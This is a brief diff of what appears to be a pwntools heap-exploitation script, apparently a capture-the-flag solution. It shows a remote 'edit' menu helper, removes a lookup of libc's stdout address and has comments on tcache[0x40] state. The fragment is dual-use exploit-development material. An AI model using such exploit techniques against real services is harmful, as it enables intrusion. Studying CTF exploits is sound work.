@@ -23,8 +23,6 @@ def edit(data):
   rem.sendlineafter(b'Edit\n', b'4')
   rem.sendafter(b':', data)
 
-stdout_addr = lib.symbols['stdout']
-
 # Initial tcache[0x40] is empty.
 # tcache[0x40]: Empty
 
